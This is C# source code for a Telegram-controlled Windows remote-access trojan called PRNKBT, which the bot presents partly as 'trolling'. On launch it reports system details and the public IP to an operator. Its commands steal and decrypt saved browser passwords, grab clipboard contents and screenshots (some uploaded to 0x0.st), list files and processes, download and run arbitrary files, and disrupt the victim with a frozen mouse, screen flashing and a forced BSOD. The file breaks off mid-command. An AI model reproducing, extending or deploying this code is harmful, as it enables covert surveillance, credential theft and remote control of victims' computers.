using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.ReplyMarkups;
using PRNKBT.Funcitons;
using PRNKBT.Objects;
using Microsoft.Win32;
using xNet;

namespace PRNKBT
{
    static class Program
    {
        static ITelegramBotClient bot;
        static void Main()
        {
            bool flag;
            Mutex mutex = new Mutex(true, "prnkbtgg", out flag);
            if (!flag) Environment.Exit(0);

            ///////////
            // proxy

            // with auth
            // var proxy = new HttpToSocks5Proxy("ip", 1080, "login", "pass");
            //// without auth
            //// var proxy = new HttpToSocks5Proxy("ip", 1080,);
            // proxy.ResolveHostnamesLocally = true;
            // bot = new TelegramBotClient(token, proxy);

            // nonproxy
            bot = new TelegramBotClient(Config.token);
            ///////////
            
            bot.OnMessage += Bot_OnMessage;
            Thread mouseth = new Thread(new ThreadStart(Mouse.freezethread));
            mouseth.Start();
            Thread blockerth = new Thread(new ThreadStart(Blocker.BlockThread));
            blockerth.Start();
            stinfo();
            bot.StartReceiving();
            Thread.Sleep(int.MaxValue);
        }
        #region Requirements for rec mic
        static bool isrec = false;
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern int record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
        #endregion
        #region Requirement for Change wallpaper
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, IntPtr lpvParam, int fuWinIni);
        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 0x1;
        public const int SPIF_SENDWININICHANGE = 0x2;
        #endregion
        private static async void stinfo()
        {
            string CPU = Sys.GetHardwareInfo("Win32_Processor", "Name")[0];
            string GPU = Sys.GetHardwareInfo("Win32_VideoController", "Name")[0];
            string pubIp = new WebClient().DownloadString("https://api.ipify.org");
            string OS = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", null);
            Size resolution = Screen.PrimaryScreen.Bounds.Size;
            string msg = string.Concat(new string[] {
                "✅ Онлайн!\n",
                "🖥 Имя ПК: `" + Environment.MachineName + "`\n",
                "🚹 Юзер: `" + Environment.UserName + "`\n",
                "🔰 Процессор: `" + CPU + "`\n",
                "▶ Видеокарта: `" + GPU + "`\n",
                "🖥 Разрешение: `" + resolution.Width + "x" + resolution.Height + "`\n",
                "✳ Система: `" + OS + "`\n",
                "🌐 IP: `" + pubIp + "`"
            });
            await bot.SendTextMessageAsync(Config.admin, msg, Telegram.Bot.Types.Enums.ParseMode.Markdown);
        }
        static async void Bot_OnMessage(object sender, MessageEventArgs e)
        {
            if (e.Message.From.Id != Config.admin) { return; }
            #region Keyboard
            var keyboard = new ReplyKeyboardMarkup
            {
                Keyboard = new[]
                     {
                    new[]
                        {
                            new KeyboardButton("---===PRNKBT by @daniel_3k00===---")
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_info),
                            new KeyboardButton(Config.kbtn_ip)
                        },
                        new[]
                        {
                            new KeyboardButton("⬇Раздел \"Тролиинг\"⬇")
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_fmouse),
                            new KeyboardButton(Config.kbtn_tpmouse),
                            new KeyboardButton(Config.kbtn_unfmouse)
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_showclock),
                            new KeyboardButton(Config.kbtn_hideclock)
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_showtb),
                            new KeyboardButton(Config.kbtn_hidetb)
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_kill_active),
                            new KeyboardButton(Config.kbtn_cmd)
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_flash)
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_wasd),
                            new KeyboardButton(Config.kbtn_hideall)
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_enblocker),
                            new KeyboardButton(Config.kbtn_disblocker)
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_bsod)
                        },
                        new[]
                        {
                            new KeyboardButton("⬇Поворот экрана⬇")
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_dr0),
                            new KeyboardButton(Config.kbtn_dr90),
                            new KeyboardButton(Config.kbtn_dr180),
                            new KeyboardButton(Config.kbtn_dr270)
                        },
                        new[]
                        {
                            new KeyboardButton("⬇Раздел \"Clipboard\"⬇")
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_clipget),
                            new KeyboardButton(Config.kbtn_clipclear)
                        },
                        new[]
                        {
                            new KeyboardButton("⬇Раздел \"Разное\"⬇")
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_passwds)
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_pwd),
                            new KeyboardButton(Config.kbtn_ps)
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_lsf),
                            new KeyboardButton(Config.kbtn_ls),
                            new KeyboardButton(Config.kbtn_lsd)
                        },
                        new[]
                        {
                            new KeyboardButton(Config.kbtn_ss),
                            new KeyboardButton(Config.kbtn_sshd)
                        }
                    }, OneTimeKeyboard = false,
                ResizeKeyboard = true
            };
            #endregion
            #region Download File and Set Wallpaper
            if (e.Message.Type == Telegram.Bot.Types.Enums.MessageType.Document)
            {
                try
                {

                    if (e.Message.Caption == "/chwall")
                    {
                        try
                        {
                            var wall = Path.GetTempFileName() + "wall.bmp";
                            await bot.SendTextMessageAsync(e.Message.Chat, "*Устанавливаю обои...*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                            FileStream wll = File.Create(wall);
                            await bot.GetInfoAndDownloadFileAsync(e.Message.Document.FileId, wll);
                            wll.Close();
                            SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, Marshal.StringToBSTR(wall), SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
                            File.Delete(wall);
                            await bot.SendTextMessageAsync(e.Message.Chat, "*Обои установлены!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                            return;
                        }
                        catch
                        {
                            await bot.SendTextMessageAsync(e.Message.Chat, "*Ошибка при установке обоев!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                catch
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Ошибка при загрузке файла \"" + e.Message.Document.FileName + "\"!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                await bot.SendTextMessageAsync(e.Message.Chat, "*Загружаю файл \"" + e.Message.Document.FileName + "\"...*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    FileStream fs = File.Create(e.Message.Document.FileName);
                    await bot.GetInfoAndDownloadFileAsync(e.Message.Document.FileId, fs);
                    fs.Close();
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Файл \"" + e.Message.Document.FileName + "\" загружен!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    if(e.Message.Caption == "/run")
                    {
                        try
                        {
                            Process.Start(e.Message.Document.FileName);
                            await bot.SendTextMessageAsync(e.Message.Chat, "*Файл \"" + e.Message.Document.FileName + "\" запущен!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                        } catch { }
                        
                    }
                return;
            }
            #endregion
            if (e.Message.Type != Telegram.Bot.Types.Enums.MessageType.Text) return;
            var msg = e.Message.Text;
            ////////////// Commands //////////////
            ///
            /// All commands are located here.
            /// 
            ////////////// Without args
            if (msg == "/start" || msg == "/help")
            {
                await bot.SendTextMessageAsync(e.Message.Chat, Config.main_menu, replyMarkup: keyboard, disableWebPagePreview: true);
            }
            else if (msg == "/ip" || msg == Config.kbtn_ip)
            {
                try
                {
                    string pubIp = new WebClient().DownloadString("https://api.ipify.org");
                    await bot.SendTextMessageAsync(e.Message.Chat, "🌐 IP: `" + pubIp + "`", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }

            }
            else if (msg == "/info" || msg == Config.kbtn_info)
            {
                stinfo();
            }
            else if (msg == "/fmouse" || msg == Config.kbtn_fmouse)
            {
                if (Mouse.freeze_m)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "Мышь и так *заморожена*!", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    return;
                }
                if (Mouse.freeze_m)
                    Mouse.freeze_m = true;
                await bot.SendTextMessageAsync(e.Message.Chat, "Мышь *заморожена*!", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
            }
            else if (msg == "/unfmouse" || msg == Config.kbtn_unfmouse)
            {
                if (Mouse.freeze_m)
                if (!Mouse.freeze_m)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "Мышь и так *разморожена*!", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    return;
                }
                if (Mouse.freeze_m)
                    Mouse.freeze_m = false;
                await bot.SendTextMessageAsync(e.Message.Chat, "Мышь *разморожена*!", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
            }
            else if (msg == "/tpmouse" || msg == Config.kbtn_tpmouse)
            {
                try
                {
                    Mouse.tpcursor();
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Курсор телепортировался!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/hideall" || msg == Config.kbtn_hideall)
            {
                try
                {
                    Keyboard.KeyDown(Keys.LWin);
                    Keyboard.KeyDown(Keys.D);
                    Keyboard.KeyUp(Keys.LWin);
                    Keyboard.KeyUp(Keys.D);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Все окна скрыты!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/cmd" || msg == Config.kbtn_cmd)
            {
                try
                {
                    Process.Start("cmd.exe");
                    await bot.SendTextMessageAsync(e.Message.Chat, "Командная строка *запущена*!", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }

            }
            else if (msg == "/passwds" || msg == Config.kbtn_passwds)
            {
                var tmp = Path.GetTempPath() + "pedwflo.txt";
                try
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Получение паролей и их дешифрование...*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    var f = File.CreateText(tmp);
                    string text = "";
                    List<PassData> pwd = Browsers.GetPasswords();
                    foreach (PassData i in pwd)
                    {
                        text += i.ToString();
                    }
                    f.Write(text);
                    f.Close();
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Отправка паролей...*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    using (var stream = File.OpenRead(tmp))
                    {
                        await bot.SendDocumentAsync(e.Message.Chat, stream, "*Пароли*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                        stream.Close();
                    }
                } catch
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Ошибка! Походу паролей нет!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                File.Delete(tmp);
            }
            else if (msg == "/kill_active" || msg == Config.kbtn_kill_active)
            {
                try
                {
                    SendKeys.SendWait("%{f4}");
                    await bot.SendTextMessageAsync(e.Message.Chat, "Приложение `" + Sys.GetActiveWindowTitle() + "` *убито*!", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/wasd" || msg == Config.kbtn_wasd)
            {
                try
                {
                    var list = new List<Keys> { Keys.W, Keys.A, Keys.S, Keys.D };
                    var random = new Random();
                    var rndchar = list.OrderBy(s => random.Next()).Take(1).ToList();
                    Keyboard.KeyDown(rndchar[0]);
                    Thread.Sleep(10);
                    Keyboard.KeyUp(rndchar[0]);
                    await bot.SendTextMessageAsync(e.Message.Chat, "Нажата клавиша `" + rndchar[0] + "`", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }

            }
            else if (msg == "/pwd" || msg == Config.kbtn_pwd)
            {
                try
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "`" + Convert.ToString(Environment.CurrentDirectory) + "`", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/ls" || msg == Config.kbtn_ls)
            {
                try
                {
                    var ls = Directory.EnumerateFileSystemEntries(Environment.CurrentDirectory);
                    string listing = "Список папок и файлов:\n";
                    foreach (string i in ls)
                    {
                        listing = listing + "`" + i.Replace(Environment.CurrentDirectory + "\\", "") + "`\n";
                    }
                    await bot.SendTextMessageAsync(e.Message.Chat, listing, Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/lsf" || msg == Config.kbtn_lsf)
            {
                try
                {
                    var lsf = Directory.EnumerateFiles(Environment.CurrentDirectory);
                    string listingf = "Список файлов:\n";
                    foreach (string i in lsf)
                    {
                        listingf = listingf + "`" + i.Replace(Environment.CurrentDirectory + "\\", "") + "`\n";
                    }
                    await bot.SendTextMessageAsync(e.Message.Chat, listingf, Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/lsd" || msg == Config.kbtn_lsd)
            {
                try
                {
                    var lsd = Directory.EnumerateDirectories(Environment.CurrentDirectory);
                    string listingd = "Список директорий:\n";
                    foreach (string i in lsd)
                    {
                        listingd = listingd + "`" + i.Replace(Environment.CurrentDirectory + "\\", "") + "`\n";
                    }
                    await bot.SendTextMessageAsync(e.Message.Chat, listingd, Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/ss" || msg == Config.kbtn_ss)
            {
                try
                {
                    Bitmap screen;
                    Rectangle screenDimensions = Screen.PrimaryScreen.Bounds;
                    Size s = new Size(screenDimensions.Width, screenDimensions.Height);
                    screen = new Bitmap(s.Width, s.Height);
                    Graphics memoryGraphics = Graphics.FromImage(screen);
                    memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                    screen.Save(Path.GetTempPath() + "scr.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                    using (var stream = File.OpenRead(Path.GetTempPath() + "scr.jpg"))
                    {
                        await bot.SendPhotoAsync(e.Message.Chat, stream, "scr.jpg", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    }
                    File.Delete(Path.GetTempPath() + "scr.jpg");
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/sshd" || msg == Config.kbtn_sshd)
            {
                try
                {
                    var tmp = Path.GetTempPath() + "scrhd.jpg";
                    Bitmap screenhd;
                    Rectangle screenDimensionshd = Screen.PrimaryScreen.Bounds;
                    Size shd = new Size(screenDimensionshd.Width, screenDimensionshd.Height);
                    screenhd = new Bitmap(shd.Width, shd.Height);
                    Graphics memoryGraphicshd = Graphics.FromImage(screenhd);
                    memoryGraphicshd.CopyFromScreen(0, 0, 0, 0, shd);
                    screenhd.Save(tmp, System.Drawing.Imaging.ImageFormat.Jpeg);
                    string url;
                    using (var request = new HttpRequest())
                    {
                        request
                            .AddFile("file", tmp);
                        url = request.Post("0x0.st").ToString();
                    }
                    await bot.SendTextMessageAsync(e.Message.Chat, url, replyToMessageId: e.Message.MessageId, disableWebPagePreview: true);
                    File.Delete(tmp);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/dr0" || msg == Config.kbtn_dr0) { 
                try
                {
                    Display.Rotate(1, Display.Orientations.DEGREES_CW_0);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Ok!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/dr90" || msg == Config.kbtn_dr90)
            {
                try
                {
                    Display.Rotate(1, Display.Orientations.DEGREES_CW_90);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Ok!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/dr180" || msg == Config.kbtn_dr180)
            {
                try
                {
                    Display.Rotate(1, Display.Orientations.DEGREES_CW_180);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Ok!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/dr270" || msg == Config.kbtn_dr270)
            {
                try
                {
                    Display.Rotate(1, Display.Orientations.DEGREES_CW_270);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Ok!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/bsod" || msg == Config.kbtn_bsod)
            {
                try
                {
                    BSoD.bsod();
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/enblocker" || msg == Config.kbtn_enblocker)
            {
                try
                {
                    if(Blocker.state)
                    {
                        await bot.SendTextMessageAsync(e.Message.Chat, "*Блокер и так включён!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    } else
                    {
                        Blocker.state = true;
                        await bot.SendTextMessageAsync(e.Message.Chat, "*Блокер включен!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    }
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/disblocker" || msg == Config.kbtn_disblocker)
            {
                try
                {
                    if (!Blocker.state)
                    {
                        await bot.SendTextMessageAsync(e.Message.Chat, "*Блокер и так выключён!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    }
                    else
                    {
                        Blocker.state = false;
                        await bot.SendTextMessageAsync(e.Message.Chat, "*Блокер выключен!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    }
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/showclock" || msg == Config.kbtn_showclock)
            {
                try
                {
                    SHFunctions.Clock(1);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Часы показаны!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/hideclock" || msg == Config.kbtn_hideclock)
            {
                try
                {
                    SHFunctions.Clock(0);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Часы скрыты!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/showtb" || msg == Config.kbtn_showtb)
            {
                try
                {
                    SHFunctions.TaskBar(1);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Панель задач показана!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/hidetb" || msg == Config.kbtn_hidetb)
            {
                try
                {
                    SHFunctions.TaskBar(0);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Панель задач скрыта!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/ps" || msg == Config.kbtn_ps)
            {
                try
                {
                    var tmp = Path.GetTempPath() + "rfhgs.txt";
                    var f = File.CreateText(tmp);
                    f.Write(ProcList.get());
                    f.Close();
                    using (var stream = File.OpenRead(tmp))
                    {
                        await bot.SendDocumentAsync(e.Message.Chat, stream, "*Список процессов*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    }
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/flash" || msg == Config.kbtn_flash)
            {
                try
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Слепим...*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                    Flash.Do(Color.White);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Ослепили!*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/clipget" || msg == Config.kbtn_clipget)
            {
                try
                {
                    Thread thread = new Thread(async() => {
                        if (Clipboard.ContainsText())
                        {
                            await bot.SendTextMessageAsync(e.Message.Chat, "<b>Содержимое буфера обмена <i>[Text]</i>:</b>\n\n" + Clipboard.GetText(), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                        }
                        else if (Clipboard.ContainsImage())
                        {
                            var tmp = Path.GetTempFileName();
                            Clipboard.GetImage().Save(tmp, Clipboard.GetImage().RawFormat);

                            await bot.SendPhotoAsync(e.Message.Chat, File.OpenRead(tmp), "*Содержимое буфера обмена* _[Photo]_", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                            File.Delete(tmp);
                        }
                        else if (Clipboard.ContainsAudio())
                        {
                            var tmp = Path.GetTempFileName();
                            var stream = Clipboard.GetAudioStream();
                            if (stream.Length != 0)
                                using (FileStream fileStream = File.Create(tmp, (int)stream.Length))
                                {
                                    byte[] data = new byte[stream.Length];
                                    stream.Read(data, 0, (int)data.Length);
                                    fileStream.Write(data, 0, data.Length);
                                }
                            await bot.SendAudioAsync(e.Message.Chat, File.OpenRead(tmp), "*Содержимое буфера обмена* _[Audio]_", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                            File.Delete(tmp);
                        }
                        else
                        {
                            await bot.SendTextMessageAsync(e.Message.Chat, "*Содержимое буфера обмена* _[None]_", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                        }
                    });
                    thread.SetApartmentState(ApartmentState.STA);
                    thread.Start();
                    thread.Join();
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (msg == "/clipclear" || msg == Config.kbtn_clipclear)
            {
                try
                {
                    Thread thread = new Thread(async () => {
                        try
                        {
                            Clipboard.Clear();
                            await bot.SendTextMessageAsync(e.Message.Chat, "*Ok*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                        }
                    });
                    thread.SetApartmentState(ApartmentState.STA);
                    thread.Start();
                    thread.Join();
                }
                catch (Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            ////////////// With args
            else if (e.Message.Text.StartsWith("/cd"))
            {
                if (e.Message.Text == "/cd") return;
                string path = e.Message.Text.Replace("/cd ", "");
                try
                {
                    Directory.SetCurrentDirectory(path);
                    await bot.SendTextMessageAsync(e.Message.Chat, "*Ok*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyToMessageId: e.Message.MessageId);
                }
                catch(Exception ex)
                {
                    await bot.SendTextMessageAsync(e.Message.Chat, "<b>Error!</b>\n\n" + Convert.ToString(ex), Telegram.Bot.Types.Enums.ParseMode.Html, replyToMessageId: e.Message.MessageId);
                }
            }
            else if (e.Message.Text.StartsWith("/type"))
            {
                if (e.Message.Text == "/type") return;
                string typein = e.Message.Text.Replace("/type ", "");
                try
                {
